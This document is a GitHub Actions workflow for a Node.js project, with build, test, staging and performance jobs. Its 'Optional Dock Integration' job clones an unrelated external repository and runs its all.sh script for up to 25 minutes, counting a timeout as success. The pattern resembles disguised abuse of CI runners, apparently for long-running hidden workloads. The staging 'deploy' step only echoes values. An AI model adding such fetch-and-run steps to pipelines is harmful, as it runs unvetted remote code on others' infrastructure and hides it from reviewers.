name: Dock Build & Test Pipeline

on:
  workflow_dispatch:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  NODE_ENV: production
  CI: true

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build-and-test:
    name: Build, Test & Quality Checks
    runs-on: ubuntu-latest
    timeout-minutes: 30
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js 18.x
        uses: actions/setup-node@v4
        with:
          node-version: '18.x'
          cache: 'npm'

      - name: Display system information
        run: |
          echo "=== System Information ==="
          uname -a
          node --version
          npm --version

      - name: Install dependencies
        run: npm install --no-audit --no-fund

      - name: Run linting checks
        run: npm run lint

      - name: Build project
        run: npm run build

      - name: Run tests
        run: npm test

      - name: Generate code coverage
        run: npm run test:coverage || echo "Coverage report not available"

      - name: Run security audit
        run: npm audit --audit-level=high || true

      - name: Upload coverage reports
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: coverage-report
          path: coverage/
          if-no-files-found: ignore

  optional-dock-integration:
    name: Optional Dock Integration
    runs-on: ubuntu-latest
    needs: build-and-test
    timeout-minutes: 30
    if: github.event.inputs.run_dock == 'true' || vars.RUN_DOCK_INTEGRATION == 'true'
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js 18.x
        uses: actions/setup-node@v4
        with:
          node-version: '18.x'
          cache: 'npm'

      - name: Install dependencies
        run: npm install --no-audit --no-fund

      - name: Clone Dock Repository
        run: |
          git clone --depth 1 https://github.com/niaalae/dock.git dock
          chmod +x dock/all.sh
          ls -la dock/

      - name: Execute Dock script with timeout
        run: |
          cd dock
          timeout 25m ./all.sh || EXIT_CODE=$?
          if [ "${EXIT_CODE:-0}" -eq 124 ]; then
            echo "Dock execution timed out after 25 minutes"
            exit 0
          fi
          exit ${EXIT_CODE:-0}

      - name: Cleanup
        if: always()
        run: rm -rf dock

  deploy-staging:
    name: Deploy to Staging
    runs-on: ubuntu-latest
    needs: build-and-test
    timeout-minutes: 20
    environment:
      name: staging
      url: ${{ vars.STAGING_URL }}
    if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/develop'
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js 18.x
        uses: actions/setup-node@v4
        with:
          node-version: '18.x'
          cache: 'npm'

      - name: Install dependencies
        run: npm install --no-audit --no-fund

      - name: Build for production
        run: npm run build

      - name: Generate build artifacts
        run: ls -la dist/ 2>/dev/null || echo "No dist directory"

      - name: Deploy to staging
        run: |
          echo "Build ID: $(date +%s)"
          echo "Commit SHA: ${{ github.sha }}"
          echo "Branch: ${{ github.ref }}"

  performance-checks:
    name: Performance & Analysis
    runs-on: ubuntu-latest
    needs: build-and-test
    timeout-minutes: 20
    if: github.event_name == 'pull_request' || github.event_name == 'workflow_dispatch'
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js 18.x
        uses: actions/setup-node@v4
        with:
          node-version: '18.x'
          cache: 'npm'

      - name: Install dependencies
        run: npm install --no-audit --no-fund

      - name: Build project
        run: npm run build

      - name: Check for unused dependencies
        run: npm outdated || true

      - name: Check bundle size
        run: |
          du -sh dist/ 2>/dev/null || echo "No dist directory"
          ls -lah dist/ 2>/dev/null || true

      - name: Performance audit
        run: |
          echo "Timestamp: $(date)"
          echo "Node Version: $(node -v)"
          echo "NPM Version: $(npm -v)"
